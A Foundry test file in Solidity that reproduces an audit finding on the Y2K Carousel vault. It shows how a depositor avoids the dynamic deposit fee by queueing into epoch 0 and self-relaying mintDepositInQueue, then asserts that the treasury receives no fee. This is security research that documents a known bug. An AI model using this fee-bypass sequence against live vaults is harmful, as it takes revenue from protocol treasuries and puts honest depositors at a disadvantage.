// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/src/v2/Carousel/Carousel.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Minimal real ERC-20 for the opaque underlying + emissions tokens.
contract Y2KFeeMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; _transfer(from, to, amount); return true; }
    function _transfer(address from, address to, uint256 amount) internal { balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); }
}

/// Reproduces Sherlock 2023-03-Y2K #75 (H-3) against the REAL audited Carousel
/// (sherlock-audit/2023-03-Y2K @ 93e3994, Earthquake/src/v2/Carousel/Carousel.sol).
///
/// Bug: the dynamic `depositFee` is only charged on the DIRECT deposit path
/// (`_deposit`, _id != 0). `mintDepositInQueue` mints `queue[i].assets - relayerFee`
/// with NO deposit-fee deduction. A late depositor therefore deposits into the
/// epoch-0 queue and, in the same tx, self-relays `mintDepositInQueue` — minting
/// their position for the target epoch while paying ZERO depositFee (and recovering
/// the relayerFee they advanced). The treasury loses the fee revenue.
contract PoC_18535 is Test {
    Carousel internal vault;
    Y2KFeeMockToken internal asset;
    Y2KFeeMockToken internal emissionsToken;

    address internal directUser = address(0xD1); // honest late direct depositor
    address internal attacker = address(0xA77ACC); // routes through the queue, self-relays

    uint256 internal constant EPOCH = 1;
    uint256 internal constant RELAYER_FEE = 1 ether; // must be >= 10000 (constructor)
    uint256 internal constant DEPOSIT_FEE_BPS = 250;  // 2.5% max (constructor cap)
    uint256 internal constant AMOUNT = 100 ether;
    uint40 internal epochBegin;

    function setUp() public {
        vm.warp(1_675_884_389);
        asset = new Y2KFeeMockToken("Underlying", "UND");
        emissionsToken = new Y2KFeeMockToken("Emissions", "EMI");

        // Deployer (this test) is factory/controller/treasury.
        vault = new Carousel(
            Carousel.ConstructorArgs({
                isWETH: false,
                assetAddress: address(asset),
                name: "Carousel",
                symbol: "CAR",
                tokenURI: "uri",
                token: address(0x1234),
                strike: 1e18,
                controller: address(this),
                treasury: address(this),
                emissionsToken: address(emissionsToken),
                relayerFee: RELAYER_FEE,
                depositFee: DEPOSIT_FEE_BPS
            })
        );

        asset.mint(directUser, AMOUNT);
        asset.mint(attacker, AMOUNT);
        vm.prank(directUser); asset.approve(address(vault), type(uint256).max);
        vm.prank(attacker);   asset.approve(address(vault), type(uint256).max);

        // epochCreation is stamped here (= now). Deposit window: [now+100, now+200].
        epochBegin = uint40(block.timestamp + 100);
        vault.setEpoch(epochBegin, epochBegin + 100, EPOCH);
    }

    function testDepositFeeBypassedViaQueue() public {
        // Move to the very end of the deposit window (now == epochBegin) so the
        // LINEAR deposit fee is at its 2.5% maximum for the direct path, while
        // deposits still satisfy `epochHasNotStarted` (block.timestamp > begin only).
        vm.warp(epochBegin);

        // --- Honest direct depositor: pays the fee to the treasury. ---
        uint256 treasuryBeforeDirect = asset.balanceOf(address(this));
        vm.prank(directUser);
        vault.deposit(EPOCH, AMOUNT, directUser);
        uint256 directFeePaid = asset.balanceOf(address(this)) - treasuryBeforeDirect;
        uint256 directShares = vault.balanceOf(directUser, EPOCH);
        assertGt(directFeePaid, 2 ether, "direct path charges ~2.5% deposit fee");
        assertEq(directShares, AMOUNT - directFeePaid, "direct shares net of fee");

        // --- Attacker: queue deposit + self-relayed mint, in the same flow. ---
        uint256 attackerAssetBefore = asset.balanceOf(attacker); // 0 (spent nothing yet minus? he still holds AMOUNT)
        assertEq(attackerAssetBefore, AMOUNT, "attacker starts with full balance");

        vm.prank(attacker);
        vault.deposit(0, AMOUNT, attacker); // epoch 0 => queued, NO fee taken

        uint256 treasuryBeforeQueueMint = asset.balanceOf(address(this));
        vm.prank(attacker); // attacker self-relays -> recovers the relayerFee
        vault.mintDepositInQueue(EPOCH, 1);

        // === CONCRETE HARM ===
        // 1. The queue mint transferred NOTHING to the treasury (fee fully bypassed).
        uint256 queueFeeToTreasury = asset.balanceOf(address(this)) - treasuryBeforeQueueMint;
        assertEq(queueFeeToTreasury, 0, "HARM: queue path pays ZERO deposit fee");

        // 2. Attacker holds MORE epoch shares than the honest direct depositor who
        //    deposited the identical amount but was charged the fee.
        uint256 attackerShares = vault.balanceOf(attacker, EPOCH);
        assertEq(attackerShares, AMOUNT - RELAYER_FEE, "attacker minted assets minus only relayerFee");
        assertGt(attackerShares, directShares, "HARM: fee-dodger out-mints the fee-payer");

        // 3. Because the attacker self-relayed, the relayerFee returned to them, so
        //    their TOTAL fee paid is exactly zero, vs directFeePaid (~2.47e18) lost
        //    by the honest depositor to the treasury.
        uint256 attackerAssetAfter = asset.balanceOf(attacker);
        uint256 attackerNetSpent = attackerAssetBefore - attackerAssetAfter; // asset that left attacker
        assertEq(attackerNetSpent, AMOUNT - RELAYER_FEE, "attacker only parted with the amount now held as shares");
        // i.e. every wei the attacker gave up is represented 1:1 as shares -> 0 fee.
        assertEq(attackerNetSpent, attackerShares, "HARM: attacker paid 0 protocol fee");

        emit log_named_uint("direct depositor fee paid to treasury (wei)", directFeePaid);
        emit log_named_uint("attacker (queue) fee paid to treasury (wei)", queueFeeToTreasury);
        emit log_named_uint("extra shares gained by fee-dodging (wei)", attackerShares - directShares);
    }
}
